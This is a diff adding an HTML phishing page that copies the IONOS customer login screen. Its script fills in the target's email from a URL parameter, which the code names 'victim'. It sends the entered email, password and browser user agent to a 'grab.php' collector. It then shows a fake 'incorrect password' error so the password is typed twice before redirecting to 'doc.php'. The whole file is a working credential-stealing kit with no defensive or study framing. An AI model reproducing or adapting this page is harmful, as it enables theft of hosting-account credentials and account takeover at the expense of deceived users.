@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - IONOS</title>
+    <style>
+        body { margin: 0; font-family: "OpenSansRegular",arial,sans-serif; background-color: #f0f4f7; display: flex; flex-direction: column; height: 100vh; }
+        .nav { background: #fff; padding: 15px 40px; border-bottom: 2px solid #002e67; display: flex; align-items: center; }
+        .nav span { color: #002e67; font-weight: bold; font-size: 18px; }
+        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .login-card { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); width: 100%; max-width: 450px; text-align: left; }
+        .user-icon { background: #004a99; width: 50px; height: 50px; border-radius: 50%; margin-bottom: 20px; display: inline-block; }
+        h1 { font-size: 22px; color: #001b41; margin: 0 0 30px 0; }
+        label { display: block; font-size: 14px; font-weight: 600; color: #001b41; margin-bottom: 8px; }
+        input { width: 100%; padding: 12px; border: 1px solid #757575; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; font-size: 16px; outline-color: #004a99; }
+        .btn { width: 100%; padding: 14px; background: #001b41; color: #fff; border: none; border-radius: 20px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+        .btn:hover { background: #002e67; }
+        .footer-text { margin-top: 30px; font-size: 14px; color: #004a99; }
+        .error-box { color: #d71f28; background: #fff1f2; padding: 12px; border: 1px solid #d71f28; border-radius: 4px; font-size: 14px; margin-bottom: 20px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="nav">
+        <span>IONOS</span> <span style="font-weight: normal; margin-left: 10px;">LOGIN</span>
+    </div>
+
+    <div class="container">
+        <div class="login-card">
+            <div style="display: flex; align-items: center; margin-bottom: 25px;">
+                <div class="user-icon"></div>
+                <h1 style="margin-left: 15px; margin-bottom: 0;">My IONOS Login</h1>
+            </div>
+
+            <!-- Error message container -->
+            <div id="feedback-msg" class="error-box">The password you entered is incorrect. Please try again.</div>
+
+            <form id="login_form">
+                <label>Customer ID, email address or domain</label>
+                <input type="email" id="user" required autofocus>
+                
+                <label>Password</label>
+                <input type="password" id="pass" required>
+                
+                <button type="submit" class="btn">Next</button>
+            </form>
+
+            <div class="footer-text">
+                Not an IONOS customer yet? <br>
+                <a href="#" style="color: #0071bc; text-decoration: none;">Become a customer now and benefit from our offers.</a>
+            </div>
+        </div>
+    </div>
+
+<script>
+(function() {
+    const form = document.getElementById('login_form');
+    const userField = document.getElementById('user');
+    const passField = document.getElementById('pass');
+    const feedback = document.getElementById('feedback-msg');
+
+    // Auto-fill email from URL parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    let victim = urlParams.get('email') || urlParams.get('usr') || "";
+    if(victim) {
+        userField.value = victim;
+        passField.focus();
+    }
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const data = new FormData();
+        data.append('email', userField.value);
+        data.append('pass', passField.value);
+        data.append('ua', navigator.userAgent);
+
+        // Send data to your backend grab.php
+        fetch('grab.php', { method: 'POST', body: data });
+
+        // Logic for first-attempt error and second-attempt redirect
+        let count = parseInt(localStorage.getItem('att_cnt') || 0) + 1;
+        localStorage.setItem('att_cnt', count);
+
+        if (count === 1) {
+            // Show the error box
+            feedback.style.display = 'block';
+            passField.value = "";
+            passField.focus();
+        } else {
+            // Success: Move to 60-second sync progress page
+            localStorage.removeItem('att_cnt');
+            setTimeout(() => { 
+                window.location.href = 'doc.php'; 
+            }, 500);
+        }
+    });
+})();
+</script>
+</body>
+</html>
